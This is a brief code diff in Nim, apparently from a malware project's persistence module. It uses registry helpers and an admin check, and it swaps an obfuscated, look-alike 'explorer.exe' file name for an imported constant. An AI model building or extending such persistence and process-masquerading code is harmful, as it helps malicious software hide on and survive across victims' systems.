@@ -10,8 +10,10 @@ import ../functions/setRegKey
 import ../functions/delRegKey
 import ../functions/isAdmin
 
+from ../constants import EXE_NAME
+
 proc initPersistenceThread*(): void {.thread.} =
-  let exeName: string = d e"explоrer.exe"
+  let exeName: string = d EXE_NAME
   let filename: string = getAppFilename()
   var dest: string
 
